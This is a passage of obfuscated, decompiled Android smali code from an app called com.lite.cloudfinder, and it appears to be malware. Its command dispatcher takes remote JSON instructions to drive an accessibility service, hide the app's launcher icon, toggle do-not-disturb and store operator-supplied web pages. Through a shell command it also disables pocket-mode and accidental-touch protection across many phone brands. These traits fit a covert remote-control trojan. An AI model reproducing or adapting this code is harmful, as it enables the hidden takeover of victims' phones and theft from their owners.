    if-eqz v3, :cond_3

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->opt(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-static {v3, v2}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    :cond_3
    const-string v2, "idSearch"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_4

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->opt(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-static {v3, v2}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    :cond_4
    const-string v2, "imeChar"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_5

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->opt(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-static {v3, v2}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    :cond_5
    const-string v2, "domain"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_6

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->opt(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    invoke-static {p1, v2}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    :cond_6
    new-instance p1, Ljava/lang/StringBuilder;

    const-string v2, "catAllViewSwitch: "

    invoke-direct {p1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-boolean v2, p0, Lڜٟٱڀ/أ;->ء:Z

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v2, "CommandDispatcher"

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v0, :cond_7

    :goto_0
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result p1

    if-ge v1, p1, :cond_7

    :try_start_0
    invoke-virtual {v0, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object p1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "screenRule["

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "] pkg="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "pkg"

    invoke-virtual {p1, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " act="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "act"

    invoke-virtual {p1, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_7
    sget-object p1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object p1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz p1, :cond_8

    const-string v1, "OK"

    goto :goto_1

    :cond_8
    const-string v1, "NULL"

    :goto_1
    const-string v3, "catAllViewSwitch svc="

    invoke-virtual {v3, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz p1, :cond_a

    iget-boolean v1, p0, Lڜٟٱڀ/أ;->ء:Z

    sput-boolean v1, Lسۄھؤۏ۫/؋;->ئ:Z

    if-eqz v0, :cond_9

    sput-object v0, Lسۄھؤۏ۫/؋;->خ:Lorg/json/JSONArray;

    :cond_9
    invoke-virtual {p1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٵ()V

    :cond_a
    return-void
.end method

.method public final ذ()V
    .locals 4

    const-class v0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;

    :try_start_0
    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->disableSelf()V

    :cond_0
    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    new-instance v2, Landroid/content/Intent;

    iget-object v3, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-direct {v2, v3, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v2}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    new-instance v2, Landroid/content/Intent;

    iget-object v3, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-direct {v2, v3, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v2}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v0

    invoke-static {v0}, Landroid/os/Process;->killProcess(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "closeEnv error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ر()V
    .locals 3

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :try_start_0
    new-instance v1, Landroid/content/Intent;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x14000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-instance v1, Landroid/content/Intent;

    const-string v2, "com.example.FINISH_OVERLAY"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "closeNewWin error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ز()V
    .locals 4

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v0}, Lڃٷښـ۝ۼ/ؠ;->ص(Landroid/content/Context;)V

    if-nez v0, :cond_0

    goto/16 :goto_2

    :cond_0
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v1, 0x0

    :try_start_0
    const-string v2, "accidental_touch_protection"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "pocket_mode_enabled"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "oplus_pocket_mode"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_c

    :try_start_1
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :try_start_2
    const-string v2, "pocket_mistouch_prevention"
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_c

    :try_start_3
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :try_start_4
    const-string v2, "pocket_mode"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "moto_touch_disable"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "touch_disable_mode"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "Touch Disable Mode 1"
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_c

    :try_start_5
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :catch_2
    :try_start_6
    const-string v2, "smart_cover_mode"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "vivo_pocket_mode"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "asus_pocket_mode"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "pocket_judge"
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_c

    :try_start_7
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    :catch_3
    :try_start_8
    const-string v2, "zte_pocket_mode"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "nubia_pocket_mode"
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_c

    :try_start_9
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    :catch_4
    :try_start_a
    const-string v2, "lenovo_pocket_mode"
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_c

    :try_start_b
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_5

    :catch_5
    :try_start_c
    const-string v2, "sony_pocket_detection"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "nothing_pocket_mode"
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_c

    :try_start_d
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_6

    :catch_6
    :try_start_e
    const-string v2, "tcl_pocket_mode"
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_c

    :try_start_f
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_7

    :catch_7
    :try_start_10
    const-string v2, "aware_lock_enabled"
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_c

    :try_start_11
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$Secure;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_8

    :catch_8
    :try_start_12
    const-string v2, "proximity_pocket_mode"
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_c

    :try_start_13
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_9

    :catch_9
    :try_start_14
    const-string v2, "prevent_pocket_mode"
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_c

    :try_start_15
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_a

    :catch_a
    :try_start_16
    const-string v2, "pocket_detection"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "anti_mistouch"

    invoke-static {v0, v2}, Lڗًقڔ/ء;->ض(Landroid/content/ContentResolver;Ljava/lang/String;)V

    const-string v2, "mistouch_prevention"
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_c

    :try_start_17
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_b

    :catch_b
    :try_start_18
    const-string v2, "accidental_touch"
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_c

    :try_start_19
    invoke-static {v0, v2, v1}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_d

    goto :goto_0

    :catch_c
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :catch_d
    :goto_0
    :try_start_1a
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "sh"

    aput-object v3, v2, v1

    const-string v1, "-c"

    const/4 v3, 0x1

    aput-object v1, v2, v3

    const-string v1, "settings put system accidental_touch_protection 0;settings put secure accidental_touch_protection 0;settings put system pocket_mode_enabled 0;settings put secure pocket_mode_enabled 0;settings put system oplus_pocket_mode 0;settings put system pocket_mistouch_prevention 0;settings put system pocket_mode 0;settings put secure pocket_mode 0;settings put system moto_touch_disable 0;settings put secure moto_touch_disable 0;settings put system touch_disable_mode 0;settings put secure touch_disable_mode 0;settings put system smart_cover_mode 0;settings put secure smart_cover_mode 0;settings put system vivo_pocket_mode 0;settings put secure vivo_pocket_mode 0;settings put system zte_pocket_mode 0;settings put secure zte_pocket_mode 0;settings put system nubia_pocket_mode 0;settings put system asus_pocket_mode 0;settings put secure asus_pocket_mode 0;settings put system pocket_judge 0;settings put system lenovo_pocket_mode 0;settings put system sony_pocket_detection 0;settings put secure sony_pocket_detection 0;settings put system nothing_pocket_mode 0;settings put system tcl_pocket_mode 0;settings put secure aware_lock_enabled 0;settings put system proximity_pocket_mode 0;settings put system prevent_pocket_mode 0;settings put system pocket_detection 0;settings put secure pocket_detection 0;settings put system anti_mistouch 0;settings put secure anti_mistouch 0;settings put system mistouch_prevention 0;settings put system accidental_touch 0;settings put global pocket_mode 0"

    const/4 v3, 0x2

    aput-object v1, v2, v3

    invoke-virtual {v0, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_e

    goto :goto_1

    :catch_e
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    const-string v0, "PocketModeDisabler"

    const-string v1, "Pocket mode disabled (all brands)"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_2
    return-void
.end method

.method public final س(Lorg/json/JSONObject;)V
    .locals 2

    const-string v0, "dnd"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result p1

    xor-int/lit8 p1, p1, 0x1

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v0, p1}, Lڗًقڔ/؋;->ؾ(Landroid/content/Context;Z)V

    return-void
.end method

.method public final ش(Lorg/json/JSONObject;)V
    .locals 3

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x1

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ض()V
    .locals 0

    invoke-virtual {p0}, Lڜٟٱڀ/أ;->ړ()V

    return-void
.end method

.method public final ظ(Lorg/json/JSONObject;)V
    .locals 8

    const-string v0, "hideMyMainActivity: show="

    const-string v1, "iconAlias"

    const-string v2, ""

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "show"

    const/4 v3, 0x0

    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result p1

    const-string v2, "CommandDispatcher"

    const-string v4, "com.lite.cloudfinder.alias.S"

    const-string v5, "com.lite.cloudfinder.alias.N"

    if-eqz p1, :cond_0

    move-object v6, v4

    goto :goto_0

    :cond_0
    move-object v6, v5

    :goto_0
    const/4 v7, 0x1

    :try_start_0
    invoke-virtual {p0, v6, v7}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    if-eqz p1, :cond_1

    invoke-virtual {p0, v5, v3}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    goto :goto_1

    :cond_1
    invoke-virtual {p0, v4, v3}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    :goto_1
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string p1, " alias="

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    const-string v0, "hideMyMainActivity error"

    invoke-static {v2, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_2
    return-void
.end method

.method public final ع()V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "config"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v3, "hideMyMainActivity"

    const-string v4, "YES"

    invoke-interface {v1, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v1, "iconAlias"

    const-string v3, "show"

    invoke-interface {v0, v1, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "com.lite.cloudfinder.alias.S"

    invoke-virtual {p0, v0, v2}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    const-string v0, "com.lite.cloudfinder.alias.N"

    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    const-string v0, "com.lite.cloudfinder.alias.Y"

    invoke-virtual {p0, v0, v2}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    :cond_0
    return-void
.end method

.method public final غ(Lorg/json/JSONObject;)V
    .locals 6

    const-string v0, "CommandDispatcher"

    const-string v1, "iconAlias: alias="

    const-string v2, "com.lite.cloudfinder.alias."

    const-string v3, "alias"

    const-string v4, ""

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "show"

    const/4 v5, 0x0

    invoke-virtual {p1, v4, v5}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result p1

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v2, p1}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " show="

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v1, "iconAlias error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ػ(Lorg/json/JSONObject;)V
    .locals 3

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x7

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ؼ(Lorg/json/JSONObject;)V
    .locals 17

    move-object/from16 v0, p1

    const-string v1, "waitpage"

    const-string v2, "accpage"

    const-string v3, ""

    const-string v4, "homepage"

    move-object/from16 v5, p0

    iget-object v6, v5, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v7, "init_data selfPkg="

    const-string v8, "CommandDispatcher"

    const-string v9, "init_data received"

    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    const-string v9, "initReceived"

    sget-object v10, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v10, v9}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v9, "selfPkg"

    invoke-virtual {v0, v9, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-nez v10, :cond_0

    const-string v10, "com.dfzkni.etcrndko"

    invoke-virtual {v10, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_0

    invoke-virtual {v7, v9}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v8, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    const/4 v9, 0x0

    invoke-virtual {v6, v7, v9}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v10

    const/4 v11, 0x4

    new-array v12, v11, [Ljava/lang/String;

    aput-object v4, v12, v9

    const-string v13, "prepage"

    const/4 v14, 0x1

    aput-object v13, v12, v14

    const/4 v13, 0x2

    aput-object v2, v12, v13

    const/4 v15, 0x3

    aput-object v1, v12, v15

    new-array v15, v11, [Ljava/lang/String;

    aput-object v4, v15, v9

    const-string v16, "prevpage"

    aput-object v16, v15, v14

    aput-object v2, v15, v13

    const/4 v2, 0x3

    aput-object v1, v15, v2

    :goto_0
    if-ge v9, v11, :cond_2

    aget-object v1, v12, v9

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    const-string v13, "http"

    invoke-virtual {v2, v13}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    aget-object v2, v15, v9

    invoke-interface {v10, v2, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "init_data saved: "

    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v13, v15, v9

    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "="

    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v8, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    add-int/lit8 v9, v9, 0x1

    goto :goto_0

    :cond_2
    invoke-interface {v10}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-interface {v7, v4, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v6}, Lڛەٟہ/ت;->؋(Landroid/content/Context;)Z

    move-result v1

